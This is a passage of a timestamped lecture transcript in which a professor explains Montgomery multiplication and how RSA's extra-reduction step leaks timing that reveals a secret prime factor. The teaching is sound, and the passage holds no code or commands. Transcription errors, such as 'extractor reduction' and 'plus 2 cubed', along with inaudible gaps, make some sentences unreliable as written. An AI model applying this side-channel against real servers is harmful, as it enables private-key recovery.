              <time_slice>39:32</time_slice>
              <text_slice>But let's first figure out
whether this is correct.</text_slice>
            </slice>
            <slice>
              <time_slice>39:34</time_slice>
              <text_slice>And then we'll figure out why
this is going to be faster.</text_slice>
            </slice>
            <slice>
              <time_slice>39:37</time_slice>
              <text_slice>So it's correct in the
sense that it's very easy.</text_slice>
            </slice>
            <slice>
              <time_slice>39:39</time_slice>
              <text_slice>If you want to
multiply some numbers,</text_slice>
            </slice>
            <slice>
              <time_slice>39:40</time_slice>
              <text_slice>we just multiply by this R
value and get the Montgomery</text_slice>
            </slice>
            <slice>
              <time_slice>39:43</time_slice>
              <text_slice>representation.</text_slice>
            </slice>
            <slice>
              <time_slice>39:44</time_slice>
              <text_slice>Then we can do all
these multiplications</text_slice>
            </slice>
            <slice>
              <time_slice>39:45</time_slice>
              <text_slice>to these Montgomery forms.</text_slice>
            </slice>
            <slice>
              <time_slice>39:47</time_slice>
              <text_slice>And every time we
multiply 2 numbers,</text_slice>
            </slice>
            <slice>
              <time_slice>39:50</time_slice>
              <text_slice>we have to divide by R,
look at the Montgomery</text_slice>
            </slice>
            <slice>
              <time_slice>39:52</time_slice>
              <text_slice>form of the
multiplication result.</text_slice>
            </slice>
            <slice>
              <time_slice>39:54</time_slice>
              <text_slice>And then when we're
done doing all</text_slice>
            </slice>
            <slice>
              <time_slice>39:56</time_slice>
              <text_slice>of our squarings,
multiplication, all this stuff,</text_slice>
            </slice>
            <slice>
              <time_slice>39:58</time_slice>
              <text_slice>we're going to move back
to the normal, regular form</text_slice>
            </slice>
            <slice>
              <time_slice>40:01</time_slice>
              <text_slice>by just dividing
by R one last time.</text_slice>
            </slice>
            <slice>
              <time_slice>40:04</time_slice>
              <text_slice>AUDIENCE: [INAUDIBLE]</text_slice>
            </slice>
            <slice>
              <time_slice>40:06</time_slice>
              <text_slice>PROFESSOR: We're
now going to pick R</text_slice>
            </slice>
            <slice>
              <time_slice>40:08</time_slice>
              <text_slice>to be a very nice number.</text_slice>
            </slice>
            <slice>
              <time_slice>40:09</time_slice>
              <text_slice>And in particular,
we're going to pick R</text_slice>
            </slice>
            <slice>
              <time_slice>40:11</time_slice>
              <text_slice>to be a very nice number to make
this division by R very fast.</text_slice>
            </slice>
            <slice>
              <time_slice>40:17</time_slice>
              <text_slice>And the cool thing is
that if this division by R</text_slice>
            </slice>
            <slice>
              <time_slice>40:21</time_slice>
              <text_slice>is going to be very
fast, then this</text_slice>
            </slice>
            <slice>
              <time_slice>40:24</time_slice>
              <text_slice>is going to be a small
number and we're not</text_slice>
            </slice>
            <slice>
              <time_slice>40:26</time_slice>
              <text_slice>going to have to do
this mod q very often.</text_slice>
            </slice>
            <slice>
              <time_slice>40:29</time_slice>
              <text_slice>In particular, aR,
let's say, is also</text_slice>
            </slice>
            <slice>
              <time_slice>40:32</time_slice>
              <text_slice>going to be roughly 500 bits
because it's all actually</text_slice>
            </slice>
            <slice>
              <time_slice>40:34</time_slice>
              <text_slice>mod p or mod q.</text_slice>
            </slice>
            <slice>
              <time_slice>40:36</time_slice>
              <text_slice>So aR is 500 bits.</text_slice>
            </slice>
            <slice>
              <time_slice>40:39</time_slice>
              <text_slice>BR is going to also be 500 bits.</text_slice>
            </slice>
            <slice>
              <time_slice>40:41</time_slice>
              <text_slice>So this product is
going to be 1,000 bits.</text_slice>
            </slice>
            <slice>
              <time_slice>40:44</time_slice>
              <text_slice>This R is going to be
this nice 500 roughly bit</text_slice>
            </slice>
            <slice>
              <time_slice>40:46</time_slice>
              <text_slice>number, same size as p.</text_slice>
            </slice>
            <slice>
              <time_slice>40:48</time_slice>
              <text_slice>And if we can make this
division to be fast,</text_slice>
            </slice>
            <slice>
              <time_slice>40:50</time_slice>
              <text_slice>then the result is going to be
a roughly 500 bit number here.</text_slice>
            </slice>
            <slice>
              <time_slice>40:55</time_slice>
              <text_slice>So we were able to do the
multiplying without having</text_slice>
            </slice>
            <slice>
              <time_slice>40:57</time_slice>
              <text_slice>to do an extra divide.</text_slice>
            </slice>
            <slice>
              <time_slice>40:59</time_slice>
              <text_slice>Dividing by R cheaply gives us
this small result, getting us</text_slice>
            </slice>
            <slice>
              <time_slice>41:03</time_slice>
              <text_slice>out of doing a mod p
for most situations.</text_slice>
            </slice>
            <slice>
              <time_slice>41:08</time_slice>
              <text_slice>OK, so what is this weird number
that I keep talking about?</text_slice>
            </slice>
            <slice>
              <time_slice>41:11</time_slice>
              <text_slice>Well R is just going
to be 2 to 512.</text_slice>
            </slice>
            <slice>
              <time_slice>41:17</time_slice>
              <text_slice>It's going to be 1
followed by a ton of zeros.</text_slice>
            </slice>
            <slice>
              <time_slice>41:22</time_slice>
              <text_slice>So multiplying by
this is easy, you just</text_slice>
            </slice>
            <slice>
              <time_slice>41:25</time_slice>
              <text_slice>append a bunch of
zeros to a number.</text_slice>
            </slice>
            <slice>
              <time_slice>41:27</time_slice>
              <text_slice>Dividing could be easy if
the low bits of the result</text_slice>
            </slice>
            <slice>
              <time_slice>41:32</time_slice>
              <text_slice>are all zeros.</text_slice>
            </slice>
            <slice>
              <time_slice>41:34</time_slice>
              <text_slice>So if you have a value
that's a bunch of bits</text_slice>
            </slice>
            <slice>
              <time_slice>41:37</time_slice>
              <text_slice>followed by 512 zeros, then
dividing by 2 to the 512</text_slice>
            </slice>
            <slice>
              <time_slice>41:41</time_slice>
              <text_slice>is cheap.</text_slice>
            </slice>
            <slice>
              <time_slice>41:41</time_slice>
              <text_slice>You just discard the zeros
on the right-hand side.</text_slice>
            </slice>
            <slice>
              <time_slice>41:44</time_slice>
              <text_slice>And that's actually
the correct division.</text_slice>
            </slice>
            <slice>
              <time_slice>41:47</time_slice>
              <text_slice>Does that make sense?</text_slice>
            </slice>
            <slice>
              <time_slice>41:48</time_slice>
              <text_slice>The slight problem
is that we actually</text_slice>
            </slice>
            <slice>
              <time_slice>41:50</time_slice>
              <text_slice>don't have zeros on
the right hand side</text_slice>
            </slice>
            <slice>
              <time_slice>41:51</time_slice>
              <text_slice>when you do this multiplication.</text_slice>
            </slice>
            <slice>
              <time_slice>41:53</time_slice>
              <text_slice>These are like real 512 bit
numbers with all the 512 bits</text_slice>
            </slice>
            <slice>
              <time_slice>41:56</time_slice>
              <text_slice>used.</text_slice>
            </slice>
            <slice>
              <time_slice>41:57</time_slice>
              <text_slice>So this will be a
1,000 bit number</text_slice>
            </slice>
            <slice>
              <time_slice>41:58</time_slice>
              <text_slice>[? or ?] with all this bits
also set to randomly 0 or 1,</text_slice>
            </slice>
            <slice>
              <time_slice>42:02</time_slice>
              <text_slice>depending on what's going on.</text_slice>
            </slice>
            <slice>
              <time_slice>42:03</time_slice>
              <text_slice>So we can't just
discard the low bits.</text_slice>
            </slice>
            <slice>
              <time_slice>42:06</time_slice>
              <text_slice>But the cleverness
comes from the fact</text_slice>
            </slice>
            <slice>
              <time_slice>42:09</time_slice>
              <text_slice>that the only
thing we care about</text_slice>
            </slice>
            <slice>
              <time_slice>42:11</time_slice>
              <text_slice>is the value of
this thing mod p.</text_slice>
            </slice>
            <slice>
              <time_slice>42:14</time_slice>
              <text_slice>So you can always add
multiples of p to this value</text_slice>
            </slice>
            <slice>
              <time_slice>42:18</time_slice>
              <text_slice>without changing it when
it's equivalent to mod p.</text_slice>
            </slice>
            <slice>
              <time_slice>42:22</time_slice>
              <text_slice>And as a result, we
can add multiples of p</text_slice>
            </slice>
            <slice>
              <time_slice>42:25</time_slice>
              <text_slice>to get the low bits
to all be zeros.</text_slice>
            </slice>
            <slice>
              <time_slice>42:28</time_slice>
              <text_slice>So let's look through
some simple examples.</text_slice>
            </slice>
            <slice>
              <time_slice>42:30</time_slice>
              <text_slice>I'm not going to write
out 512 bits on the board.</text_slice>
            </slice>
            <slice>
              <time_slice>42:33</time_slice>
              <text_slice>But suppose that--
here's a short example.</text_slice>
            </slice>
            <slice>
              <time_slice>42:40</time_slice>
              <text_slice>Suppose that we have
a situation where</text_slice>
            </slice>
            <slice>
              <time_slice>42:42</time_slice>
              <text_slice>our value R is 2 to the 4th.</text_slice>
            </slice>
            <slice>
              <time_slice>42:46</time_slice>
              <text_slice>So it's 1 followed
by four zeros.</text_slice>
            </slice>
            <slice>
              <time_slice>42:49</time_slice>
              <text_slice>So this is a much smaller
example than the real thing.</text_slice>
            </slice>
            <slice>
              <time_slice>42:53</time_slice>
              <text_slice>But let's see how this
Montgomery division</text_slice>
            </slice>
            <slice>
              <time_slice>42:55</time_slice>
              <text_slice>is going to work out.</text_slice>
            </slice>
            <slice>
              <time_slice>42:57</time_slice>
              <text_slice>So suppose we're going to try
to compute stuff mod q, where</text_slice>
            </slice>
            <slice>
              <time_slice>43:02</time_slice>
              <text_slice>q, let's say, is maybe 7.</text_slice>
            </slice>
            <slice>
              <time_slice>43:05</time_slice>
              <text_slice>So this is 1 1 1 in binary form.</text_slice>
            </slice>
            <slice>
              <time_slice>43:10</time_slice>
              <text_slice>And what we're
going to try to do</text_slice>
            </slice>
            <slice>
              <time_slice>43:12</time_slice>
              <text_slice>is maybe we did
some multiplication.</text_slice>
            </slice>
            <slice>
              <time_slice>43:16</time_slice>
              <text_slice>And this value aR
times bR is equal</text_slice>
            </slice>
            <slice>
              <time_slice>43:19</time_slice>
              <text_slice>to this binary
presentation 1 1 0 1 0.</text_slice>
            </slice>
            <slice>
              <time_slice>43:26</time_slice>
              <text_slice>So this is going to be
the value of aR times bR.</text_slice>
            </slice>
            <slice>
              <time_slice>43:31</time_slice>
              <text_slice>How do we divide it by R?</text_slice>
            </slice>
            <slice>
              <time_slice>43:32</time_slice>
              <text_slice>So clearly the low
four bits aren't all 0,</text_slice>
            </slice>
            <slice>
              <time_slice>43:35</time_slice>
              <text_slice>so we can't just divide it out.</text_slice>
            </slice>
            <slice>
              <time_slice>43:37</time_slice>
              <text_slice>But we can add multiples of q.</text_slice>
            </slice>
            <slice>
              <time_slice>43:40</time_slice>
              <text_slice>In particular, we
can add 2 times q.</text_slice>
            </slice>
            <slice>
              <time_slice>43:45</time_slice>
              <text_slice>So 2q is equal to 1 1 1 0.</text_slice>
            </slice>
            <slice>
              <time_slice>43:49</time_slice>
              <text_slice>And now what we get
is 0 0, carry a 1, 0,</text_slice>
            </slice>
            <slice>
              <time_slice>43:56</time_slice>
              <text_slice>carry a 1, 1, carry a 1, 0 1.</text_slice>
            </slice>
            <slice>
              <time_slice>44:01</time_slice>
              <text_slice>I hope I did that right.</text_slice>
            </slice>
            <slice>
              <time_slice>44:02</time_slice>
              <text_slice>So this is what we get.</text_slice>
            </slice>
            <slice>
              <time_slice>44:03</time_slice>
              <text_slice>So now we get aR
bR plus 2 cubed.</text_slice>
            </slice>
            <slice>
              <time_slice>44:07</time_slice>
              <text_slice>But we actually don't care
about the plus 2 cubed.</text_slice>
            </slice>
            <slice>
              <time_slice>44:09</time_slice>
              <text_slice>It's actually fine
because all we care about</text_slice>
            </slice>
            <slice>
              <time_slice>44:11</time_slice>
              <text_slice>is the value of mod q.</text_slice>
            </slice>
            <slice>
              <time_slice>44:15</time_slice>
              <text_slice>And now we're closer, we have
three 0 bits at the bottom.</text_slice>
            </slice>
            <slice>
              <time_slice>44:18</time_slice>
              <text_slice>Now we can add
another multiple of q.</text_slice>
            </slice>
            <slice>
              <time_slice>44:20</time_slice>
              <text_slice>This time it's going
to be probably 8q.</text_slice>
            </slice>
            <slice>
              <time_slice>44:23</time_slice>
              <text_slice>So we add 1 1 1 here 0 0.</text_slice>
            </slice>
            <slice>
              <time_slice>44:26</time_slice>
              <text_slice>And if we add it, we're
going to get, let's say,</text_slice>
            </slice>
            <slice>
              <time_slice>44:29</time_slice>
              <text_slice>0 0 0 then add these two guys
0, carry a 1, 0, carry a 1, 1 1.</text_slice>
            </slice>
            <slice>
              <time_slice>44:37</time_slice>
              <text_slice>I think that's right.</text_slice>
            </slice>
            <slice>
              <time_slice>44:38</time_slice>
              <text_slice>But now we have
our original aR bR</text_slice>
            </slice>
            <slice>
              <time_slice>44:41</time_slice>
              <text_slice>plus 2q plus 8q is
equal to this thing.</text_slice>
            </slice>
            <slice>
              <time_slice>44:45</time_slice>
              <text_slice>And finally, we can divide
this thing by R very cheaply.</text_slice>
            </slice>
            <slice>
              <time_slice>44:48</time_slice>
              <text_slice>Because we just discard
the low four zeros.</text_slice>
            </slice>
            <slice>
              <time_slice>44:54</time_slice>
              <text_slice>Make sense?</text_slice>
            </slice>
            <slice>
              <time_slice>44:56</time_slice>
              <text_slice>Question.</text_slice>
            </slice>
            <slice>
              <time_slice>44:57</time_slice>
              <text_slice>AUDIENCE: Is aR bR always
going to end in, I guess,</text_slice>
            </slice>
            <slice>
              <time_slice>45:01</time_slice>
              <text_slice>1,024 zeros?</text_slice>
            </slice>
            <slice>
              <time_slice>45:03</time_slice>
              <text_slice>PROFESSOR: No, and the
reason is that-- OK,</text_slice>
            </slice>
            <slice>
              <time_slice>45:08</time_slice>
              <text_slice>here is the thing
that's maybe confusing.</text_slice>
            </slice>
            <slice>
              <time_slice>45:10</time_slice>
              <text_slice>A was, let's say, 512 bits.</text_slice>
            </slice>
            <slice>
              <time_slice>45:12</time_slice>
              <text_slice>Then you multiply it by
R. So here, you're right.</text_slice>
            </slice>
            <slice>
              <time_slice>45:15</time_slice>
              <text_slice>This value is that 1,000 bit
number where the high bit is</text_slice>
            </slice>
            <slice>
              <time_slice>45:19</time_slice>
              <text_slice>a, the high 512 bits are a.</text_slice>
            </slice>
            <slice>
              <time_slice>45:20</time_slice>
              <text_slice>And the low bits are all zeros.</text_slice>
            </slice>
            <slice>
              <time_slice>45:22</time_slice>
              <text_slice>But then, you're going
[? to do it with ?] mod</text_slice>
            </slice>
            <slice>
              <time_slice>45:24</time_slice>
              <text_slice>q to bring it down
to make it smaller.</text_slice>
            </slice>
            <slice>
              <time_slice>45:27</time_slice>
              <text_slice>And in general, this is
going to be the case.</text_slice>
            </slice>
            <slice>
              <time_slice>45:29</time_slice>
              <text_slice>Because [? it only ?] has
these low zeros the first time</text_slice>
            </slice>
            <slice>
              <time_slice>45:32</time_slice>
              <text_slice>you convert it.</text_slice>
            </slice>
            <slice>
              <time_slice>45:33</time_slice>
              <text_slice>But after you do a
couple multiplications,</text_slice>
            </slice>
            <slice>
              <time_slice>45:35</time_slice>
              <text_slice>they're going to
be arbitrary bits.</text_slice>
            </slice>
            <slice>
              <time_slice>45:37</time_slice>
              <text_slice>So these guys are--
so I really should</text_slice>
            </slice>
            <slice>
              <time_slice>45:40</time_slice>
              <text_slice>have written mod q here--
and to compute this mod q</text_slice>
            </slice>
            <slice>
              <time_slice>45:43</time_slice>
              <text_slice>as soon as you do the conversion
to keep the whole value small.</text_slice>
            </slice>
            <slice>
              <time_slice>45:49</time_slice>
              <text_slice>AUDIENCE: [INAUDIBLE]</text_slice>
            </slice>
            <slice>
              <time_slice>45:50</time_slice>
              <text_slice>PROFESSOR: Yeah, so the
initial conversion is expensive</text_slice>
            </slice>
            <slice>
              <time_slice>45:53</time_slice>
              <text_slice>or at least it's as expensive
as doing a regular modulus</text_slice>
            </slice>
            <slice>
              <time_slice>45:58</time_slice>
              <text_slice>during the multiplication.</text_slice>
            </slice>
            <slice>
              <time_slice>46:01</time_slice>
              <text_slice>The cool thing is
that you pay this cost</text_slice>
            </slice>
            <slice>
              <time_slice>46:03</time_slice>
              <text_slice>just once when you do the
conversion into Montgomery</text_slice>
            </slice>
            <slice>
              <time_slice>46:05</time_slice>
              <text_slice>form.</text_slice>
            </slice>
            <slice>
              <time_slice>46:06</time_slice>
              <text_slice>And then, instead of converting
it back at every step,</text_slice>
            </slice>
            <slice>
              <time_slice>46:09</time_slice>
              <text_slice>you just keep it
in Montgomery form.</text_slice>
            </slice>
            <slice>
              <time_slice>46:11</time_slice>
              <text_slice>But remember that in order
to do an exponentiation</text_slice>
            </slice>
            <slice>
              <time_slice>46:13</time_slice>
              <text_slice>to an exponent
which has 512 bits,</text_slice>
            </slice>
            <slice>
              <time_slice>46:16</time_slice>
              <text_slice>you're saying
you're going to have</text_slice>
            </slice>
            <slice>
              <time_slice>46:17</time_slice>
              <text_slice>to do over 500 multiplications
because we have to do at least</text_slice>
            </slice>
            <slice>
              <time_slice>46:21</time_slice>
              <text_slice>500 squarings plus then some.</text_slice>
            </slice>
            <slice>
              <time_slice>46:23</time_slice>
              <text_slice>So you do these mod
q twice and then</text_slice>
            </slice>
            <slice>
              <time_slice>46:27</time_slice>
              <text_slice>you get a lot of cheap divisions
if you stay in this form.</text_slice>
            </slice>
            <slice>
              <time_slice>46:30</time_slice>
              <text_slice>And then you do a division by R
to get back to this form again.</text_slice>
            </slice>
            <slice>
              <time_slice>46:34</time_slice>
              <text_slice>So instead of doing 500 mod qs
for every multiplication step,</text_slice>
            </slice>
            <slice>
              <time_slice>46:37</time_slice>
              <text_slice>you do it twice mod q.</text_slice>
            </slice>
            <slice>
              <time_slice>46:39</time_slice>
              <text_slice>And then you keep
doing these divisions</text_slice>
            </slice>
            <slice>
              <time_slice>46:41</time_slice>
              <text_slice>by R cheaply using this trick.</text_slice>
            </slice>
            <slice>
              <time_slice>46:45</time_slice>
              <text_slice>Question.</text_slice>
            </slice>
            <slice>
              <time_slice>46:45</time_slice>
              <text_slice>AUDIENCE: So when you're
adding the multiples of q</text_slice>
            </slice>
            <slice>
              <time_slice>46:49</time_slice>
              <text_slice>and then dividing
by R, [INAUDIBLE]</text_slice>
            </slice>
            <slice>
              <time_slice>46:54</time_slice>
              <text_slice>PROFESSOR: Because it's
actually mod q means</text_slice>
            </slice>
            <slice>
              <time_slice>46:56</time_slice>
              <text_slice>the remainder when
you divide by q.</text_slice>
            </slice>
            <slice>
              <time_slice>46:58</time_slice>
              <text_slice>So x plus y times
q, mod q is just x.</text_slice>
            </slice>
            <slice>
              <time_slice>47:07</time_slice>
              <text_slice>AUDIENCE: [INAUDIBLE]</text_slice>
            </slice>
            <slice>
              <time_slice>47:12</time_slice>
              <text_slice>PROFESSOR: So in this case,
dividing by-- so another sort</text_slice>
            </slice>
            <slice>
              <time_slice>47:16</time_slice>
              <text_slice>of nice property is
that because it's</text_slice>
            </slice>
            <slice>
              <time_slice>47:17</time_slice>
              <text_slice>all modulus at prime
number-- it's also true</text_slice>
            </slice>
            <slice>
              <time_slice>47:22</time_slice>
              <text_slice>that if you have x
plus yq divided by R,</text_slice>
            </slice>
            <slice>
              <time_slice>47:28</time_slice>
              <text_slice>mod q is actually the same
as x divided by R mod q.</text_slice>
            </slice>
            <slice>
              <time_slice>47:35</time_slice>
              <text_slice>The way to think of it is
that there's no real division</text_slice>
            </slice>
            <slice>
              <time_slice>47:39</time_slice>
              <text_slice>in modular arithmetic.</text_slice>
            </slice>
            <slice>
              <time_slice>47:40</time_slice>
              <text_slice>It's just an inverse.</text_slice>
            </slice>
            <slice>
              <time_slice>47:41</time_slice>
              <text_slice>So what this really
says is this is actually</text_slice>
            </slice>
            <slice>
              <time_slice>47:44</time_slice>
              <text_slice>x plus yq times some
number called R inverse.</text_slice>
            </slice>
            <slice>
              <time_slice>47:49</time_slice>
              <text_slice>And then you compute
this whole thing mod q.</text_slice>
            </slice>
            <slice>
              <time_slice>47:52</time_slice>
              <text_slice>And then you could think of
this as x times R inverse</text_slice>
            </slice>
            <slice>
              <time_slice>47:57</time_slice>
              <text_slice>mod q plus y [? u ?]
R inverse mod q.</text_slice>
            </slice>
            <slice>
              <time_slice>48:05</time_slice>
              <text_slice>And this thing cancels out
because it's something times q.</text_slice>
            </slice>
            <slice>
              <time_slice>48:15</time_slice>
              <text_slice>And there's some closed
form for this thing.</text_slice>
            </slice>
            <slice>
              <time_slice>48:17</time_slice>
              <text_slice>So here I did it by bit by
bit, 2q then 8q, et cetera.</text_slice>
            </slice>
            <slice>
              <time_slice>48:22</time_slice>
              <text_slice>It's actually a
nice closed formula</text_slice>
            </slice>
            <slice>
              <time_slice>48:23</time_slice>
              <text_slice>you can compute-- it's
in the lecture notes,</text_slice>
            </slice>
            <slice>
              <time_slice>48:25</time_slice>
              <text_slice>but it's probably not worth
spending time on the board</text_slice>
            </slice>
            <slice>
              <time_slice>48:27</time_slice>
              <text_slice>here-- for how do you figure
out what multiple of q</text_slice>
            </slice>
            <slice>
              <time_slice>48:31</time_slice>
              <text_slice>should you add to get all
the low bits to turn to 0.</text_slice>
            </slice>
            <slice>
              <time_slice>48:35</time_slice>
              <text_slice>So then it turns out that in
order to do this division by R,</text_slice>
            </slice>
            <slice>
              <time_slice>48:38</time_slice>
              <text_slice>you just need to compute this
magic multiple of q, add it.</text_slice>
            </slice>
            <slice>
              <time_slice>48:43</time_slice>
              <text_slice>And then discard the
low bits and that</text_slice>
            </slice>
            <slice>
              <time_slice>48:46</time_slice>
              <text_slice>brings your number back to 512
bits, or whatever the size is.</text_slice>
            </slice>
            <slice>
              <time_slice>48:53</time_slice>
              <text_slice>OK.</text_slice>
            </slice>
            <slice>
              <time_slice>48:54</time_slice>
              <text_slice>And here's the subtlety.</text_slice>
            </slice>
            <slice>
              <time_slice>48:55</time_slice>
              <text_slice>The only reason we're
talking about this</text_slice>
            </slice>
            <slice>
              <time_slice>48:57</time_slice>
              <text_slice>is that there's something
funny going on here</text_slice>
            </slice>
            <slice>
              <time_slice>49:00</time_slice>
              <text_slice>that is going to allow us
to learn timing information.</text_slice>
            </slice>
            <slice>
              <time_slice>49:05</time_slice>
              <text_slice>And in particular, even
though we divided by R,</text_slice>
            </slice>
            <slice>
              <time_slice>49:09</time_slice>
              <text_slice>we know the result is
going to be 512 bits.</text_slice>
            </slice>
            <slice>
              <time_slice>49:12</time_slice>
              <text_slice>But it still might
be greater than q</text_slice>
            </slice>
            <slice>
              <time_slice>49:15</time_slice>
              <text_slice>because q isn't exactly
[? up to 512 ?],</text_slice>
            </slice>
            <slice>
              <time_slice>49:16</time_slice>
              <text_slice>it's not a 512 bit number.</text_slice>
            </slice>
            <slice>
              <time_slice>49:18</time_slice>
              <text_slice>So it might be a
little bit less than R.</text_slice>
            </slice>
            <slice>
              <time_slice>49:20</time_slice>
              <text_slice>So it might be that after we
do this cheap division by R,</text_slice>
            </slice>
            <slice>
              <time_slice>49:24</time_slice>
              <text_slice>[? the way ?] we
subtract out q one more</text_slice>
            </slice>
            <slice>
              <time_slice>49:26</time_slice>
              <text_slice>time because we get something
that's small but not</text_slice>
            </slice>
            <slice>
              <time_slice>49:29</time_slice>
              <text_slice>quite small enough.</text_slice>
            </slice>
            <slice>
              <time_slice>49:31</time_slice>
              <text_slice>So there's a chance that
after doing this division,</text_slice>
            </slice>
            <slice>
              <time_slice>49:34</time_slice>
              <text_slice>we maybe have to also
subtract q again.</text_slice>
            </slice>
            <slice>
              <time_slice>49:39</time_slice>
              <text_slice>And this subtraction is
going to be part of what</text_slice>
            </slice>
            <slice>
              <time_slice>49:42</time_slice>
              <text_slice>this attack is all about.</text_slice>
            </slice>
            <slice>
              <time_slice>49:44</time_slice>
              <text_slice>It turns out that
subtracting this q adds time.</text_slice>
            </slice>
            <slice>
              <time_slice>49:48</time_slice>
              <text_slice>And someone figured
out-- not these guys</text_slice>
            </slice>
            <slice>
              <time_slice>49:51</time_slice>
              <text_slice>but some previous
work-- that you</text_slice>
            </slice>
            <slice>
              <time_slice>49:53</time_slice>
              <text_slice>show that this probability
of doing this thing, this</text_slice>
            </slice>
            <slice>
              <time_slice>49:56</time_slice>
              <text_slice>is called an
extractor reduction.</text_slice>
            </slice>
            <slice>
              <time_slice>50:03</time_slice>
              <text_slice>This probability sort of
depends on the particular value</text_slice>
            </slice>
            <slice>
              <time_slice>50:10</time_slice>
              <text_slice>that you're exponentiating.</text_slice>
            </slice>
            <slice>
              <time_slice>50:12</time_slice>
              <text_slice>So if you're computing
x to the d mod q,</text_slice>
            </slice>
            <slice>
              <time_slice>50:19</time_slice>
              <text_slice>the probability of
an extra reduction,</text_slice>
            </slice>
            <slice>
              <time_slice>50:22</time_slice>
              <text_slice>at some point while
computing x to the d mod q,</text_slice>
            </slice>
            <slice>
              <time_slice>50:25</time_slice>
              <text_slice>is going to be equal to
x mod q divided by 2R.</text_slice>
            </slice>
            <slice>
              <time_slice>50:36</time_slice>
              <text_slice>So if we're going to be
computing x to the mod q,</text_slice>
            </slice>
            <slice>
              <time_slice>50:40</time_slice>
              <text_slice>then depending on what
the value of x mod q</text_slice>
            </slice>
            <slice>
              <time_slice>50:43</time_slice>
              <text_slice>is, whether it's
big or small, you're</text_slice>
            </slice>
            <slice>
              <time_slice>50:45</time_slice>
              <text_slice>going to have even more or
less of these extra reductions.</text_slice>
            </slice>
            <slice>
              <time_slice>50:49</time_slice>
              <text_slice>And just to show you where
this is going to fit in,</text_slice>
            </slice>
            <slice>
              <time_slice>50:51</time_slice>
              <text_slice>this is actually going to
happen in the decrypt step,</text_slice>
            </slice>
            <slice>
              <time_slice>50:53</time_slice>
              <text_slice>because during the decrypt
step, the server is going</text_slice>
            </slice>
            <slice>
              <time_slice>50:55</time_slice>
              <text_slice>to be computing c to the d.</text_slice>
            </slice>
            <slice>
              <time_slice>50:57</time_slice>
              <text_slice>And this says the
extractor reductions</text_slice>
            </slice>
            <slice>
              <time_slice>51:00</time_slice>
              <text_slice>are going to be proportional to
how close x, or c in this case,</text_slice>
            </slice>
            <slice>
              <time_slice>51:05</time_slice>
              <text_slice>is to the value q.</text_slice>
            </slice>
            <slice>
              <time_slice>51:07</time_slice>
              <text_slice>So this is going to
be worrisome, right,</text_slice>
            </slice>
            <slice>
              <time_slice>51:08</time_slice>
              <text_slice>because the attacker gets
to choose the input c.</text_slice>
            </slice>
            <slice>
              <time_slice>51:12</time_slice>
              <text_slice>And the number of
extractor reductions</text_slice>
            </slice>
            <slice>
              <time_slice>51:14</time_slice>
              <text_slice>is going to be proportional
to how close the c is</text_slice>
            </slice>
            <slice>
              <time_slice>51:16</time_slice>
              <text_slice>to one of the factors, the q.</text_slice>
            </slice>
            <slice>
              <time_slice>51:18</time_slice>
              <text_slice>And this is how you're going
to tell I'm getting close</text_slice>
            </slice>
            <slice>
              <time_slice>51:21</time_slice>
              <text_slice>to the q, or I've overshot q.</text_slice>
            </slice>
            <slice>
              <time_slice>51:23</time_slice>
              <text_slice>And all of a sudden, there's
no extractor reductions,</text_slice>
            </slice>
            <slice>
              <time_slice>51:25</time_slice>
              <text_slice>it's probably because x mod
q is very small the x is</text_slice>
            </slice>
            <slice>
              <time_slice>51:28</time_slice>
              <text_slice>q plus little epsilon.</text_slice>
            </slice>
            <slice>
              <time_slice>51:29</time_slice>
              <text_slice>And it's very small.</text_slice>
            </slice>
            <slice>
              <time_slice>51:31</time_slice>
              <text_slice>So that's one part
of the timing attack</text_slice>
            </slice>
            <slice>
              <time_slice>51:33</time_slice>
              <text_slice>we're going to be
looking at in a second.</text_slice>
            </slice>
            <slice>
              <time_slice>51:38</time_slice>
              <text_slice>I don't have any proof that
this actually true [INAUDIBLE]</text_slice>
            </slice>
            <slice>
              <time_slice>51:42</time_slice>
              <text_slice>these extractor
reductions work like this.</text_slice>
            </slice>
            <slice>
              <time_slice>51:44</time_slice>
              <text_slice>Yea, question.</text_slice>
            </slice>
            <slice>
              <time_slice>51:45</time_slice>
              <text_slice>AUDIENCE: What happens if you
don't do this extra reduction?</text_slice>
            </slice>
            <slice>
              <time_slice>51:48</time_slice>
              <text_slice>PROFESSOR: Oh, what happens
if you don't do this extractor</text_slice>
            </slice>
            <slice>
              <time_slice>51:51</time_slice>
              <text_slice>reduction?</text_slice>
            </slice>
            <slice>
              <time_slice>51:55</time_slice>
              <text_slice>You can avoid this
extra reduction.</text_slice>
            </slice>
            <slice>
              <time_slice>51:57</time_slice>
              <text_slice>And then you just have
to do some extra probably</text_slice>
            </slice>
            <slice>
              <time_slice>52:01</time_slice>
              <text_slice>modular reductions later.</text_slice>
            </slice>
            <slice>
              <time_slice>52:03</time_slice>
              <text_slice>I think the math just
works out nicely this way</text_slice>
            </slice>
            <slice>
              <time_slice>52:06</time_slice>
              <text_slice>for the Montgomery form.</text_slice>
            </slice>
            <slice>
              <time_slice>52:07</time_slice>
              <text_slice>I think for many of these
things it's actually</text_slice>
            </slice>
            <slice>
              <time_slice>52:09</time_slice>
              <text_slice>once you look at them as a
timing channel [INAUDIBLE]</text_slice>
            </slice>
            <slice>
              <time_slice>52:12</time_slice>
              <text_slice>[? think ?] don't
do this at all,</text_slice>
            </slice>
            <slice>
              <time_slice>52:13</time_slice>
              <text_slice>or maybe you should
do some other plan.</text_slice>
            </slice>
            <slice>
              <time_slice>52:16</time_slice>
              <text_slice>So you're right,</text_slice>
            </slice>
            <slice>
              <time_slice>52:16</time_slice>
              <text_slice>I think you could probably
avoid this extra reduction</text_slice>
            </slice>
            <slice>
              <time_slice>52:19</time_slice>
              <text_slice>and probably just do the
mod q, perhaps at the end.</text_slice>
            </slice>
            <slice>
              <time_slice>52:22</time_slice>
              <text_slice>I haven't actually
tried implementing this.</text_slice>
            </slice>
            <slice>
              <time_slice>52:24</time_slice>
              <text_slice>But it seems like it could work.</text_slice>
            </slice>
            <slice>
              <time_slice>52:27</time_slice>
              <text_slice>It might be that you just
have to do mod q once</text_slice>
            </slice>
            <slice>
              <time_slice>52:29</time_slice>
              <text_slice>[? there ?], which you'll
probably have to do anyway.</text_slice>
            </slice>
            <slice>
              <time_slice>52:31</time_slice>
              <text_slice>So it's not super clear.</text_slice>
            </slice>
            <slice>
              <time_slice>52:32</time_slice>
              <text_slice>Maybe it's [INAUDIBLE]
probably not q.</text_slice>
            </slice>
            <slice>
              <time_slice>52:37</time_slice>
              <text_slice>So in light of the
fact that [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>52:44</time_slice>
              <text_slice>Actually, I shouldn't speak
authoritatively to this.</text_slice>
            </slice>
